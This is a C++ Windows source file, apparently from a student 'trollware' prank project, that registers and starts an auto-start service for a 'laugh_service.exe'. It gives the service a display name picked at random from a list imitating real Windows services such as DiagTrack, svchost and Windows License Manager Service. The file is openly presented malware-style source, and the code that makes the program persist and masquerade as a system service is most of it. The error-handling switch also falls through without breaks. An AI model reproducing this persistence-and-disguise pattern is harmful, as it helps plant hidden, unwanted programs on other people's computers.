#include <windows.h>
#include <iostream>
#include <filesystem>
#include <vector>





std::vector<std::string> Sample_Service_Names = {"Audiosrv", "BluetoothUserService", "COMSysApp", "svchost",
"DiagTrack", "Hyper-V Data Exchange Service", "Microsoft (R) Diagnostics Hub Standard Collector Service",
"Windows License Manager Service", "Xbox Accessory Management Service"};



int register_service_laugh_sound(std::string service_path, std::string Service_Name)
{

    srand(time(0));
    int random_index = rand()%Sample_Service_Names.size();
    
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCManager)
    {
        SC_HANDLE hService = CreateServiceA(
            hSCManager,
            Service_Name.c_str(),//"LaughService",   //TECH DEBT         // Service name, I will leave this name constant just to make it easier for me -Ayman- to kill this service if I ever wanted to
            Sample_Service_Names[random_index].c_str(),//"MP3Service",  // Display name
            SERVICE_ALL_ACCESS,          // Access rights
            SERVICE_WIN32_OWN_PROCESS,   // Service type
            SERVICE_AUTO_START,          // Start type
            SERVICE_ERROR_NORMAL,        // Error control type
            service_path.c_str(), // Path to the service executable
            NULL, NULL, NULL, NULL, NULL);

        if (hService)
        {
            std::cout << "Service installed successfully!" << std::endl;
            CloseServiceHandle(hService);
        }
        else
        {
            std::cerr << "Failed to install service!" << std::endl;
        }

        CloseServiceHandle(hSCManager);
    }
    else
    {
        std::cerr << "Failed to open service manager!" << std::endl;
    }



    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager)
    {
        SC_HANDLE hService = OpenServiceA(hSCManager, "LaughService", SERVICE_START);
        if (hService)
        {
            SC_HANDLE hService = OpenServiceA(hSCManager, "LaughService", SERVICE_START);
        
            int result = StartService(hService, 0, NULL);
            if (result) {std::cout << "Service started successfully!" << std::endl;}
            else{
                int StartServiceResultProbe = GetLastError();
                std::cerr << "Failed to start service, ERROR CODE = "<<StartServiceResultProbe << std::endl;
                switch (StartServiceResultProbe){
                    case ERROR_ACCESS_DENIED:
                        std::cerr << "Failed to start service, ACCESS_DENIED!" << std::endl;
                    case ERROR_INVALID_HANDLE:
                        std::cerr << "Failed to start service, ERROR_INVALID_HANDLE!" << std::endl;
                    case ERROR_PATH_NOT_FOUND:
                        std::cerr << "Failed to start service, ERROR_PATH_NOT_FOUND!" << std::endl;
                    case ERROR_SERVICE_ALREADY_RUNNING:
                        std::cerr << "Failed to start service, ERROR_SERVICE_ALREADY_RUNNING!" << std::endl;
                    case ERROR_SERVICE_DATABASE_LOCKED:
                        std::cerr << "Failed to start service, ERROR_SERVICE_DATABASE_LOCKED!" << std::endl;
                    case ERROR_SERVICE_DEPENDENCY_DELETED:
                        std::cerr << "Failed to start service, ERROR_SERVICE_DEPENDENCY_DELETED!" << std::endl;
                    case ERROR_SERVICE_DEPENDENCY_FAIL:
                        std::cerr << "Failed to start service, ERROR_SERVICE_DEPENDENCY_FAIL!" << std::endl;
                    case ERROR_SERVICE_DISABLED:
                        std::cerr << "Failed to start service, ERROR_SERVICE_DISABLED!" << std::endl;
                    case ERROR_SERVICE_LOGON_FAILED:
                        std::cerr << "Failed to start service, ERROR_SERVICE_LOGON_FAILED!" << std::endl;
                    case ERROR_SERVICE_MARKED_FOR_DELETE:
                        std::cerr << "Failed to start service, ERROR_SERVICE_MARKED_FOR_DELETE!" << std::endl;
                    case ERROR_SERVICE_NO_THREAD:
                        std::cerr << "Failed to start service, ERROR_SERVICE_NO_THREAD!" << std::endl;
                    case ERROR_SERVICE_REQUEST_TIMEOUT:
                        std::cerr << "Failed to start service, ERROR_SERVICE_REQUEST_TIMEOUT!" << std::endl;
                    default:
                        std::cerr << "Failed to start service, Unk ERROR!" << std::endl;
                }
            }

            CloseServiceHandle(hService);
        }
        else
        {
            std::cerr << "Failed to open service!" << std::endl;
        }

        CloseServiceHandle(hSCManager);
    }
    else
    {
        std::cerr << "Failed to open service manager!" << std::endl;
    }

    //CreateServiceA(hndl, "LaughService", "EidFar5a", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, "D:\\CLASSSWORKKK\\far5a\\Far5a-Trollware\\bin\\laugh_service.exe", 0, 0, 0, 0, 0);
    //StartServiceA(hndl, 0, NULL);


    return 0;

}



// int main()
// {
    
//     std::string LaughServicePath = "D:\\CLASSSWORKKK\\far5a\\Far5a-Trollware\\bin\\laugh_service.exe";
//     register_service_laugh_sound(LaughServicePath, "LaughService");


//     return 0;
// }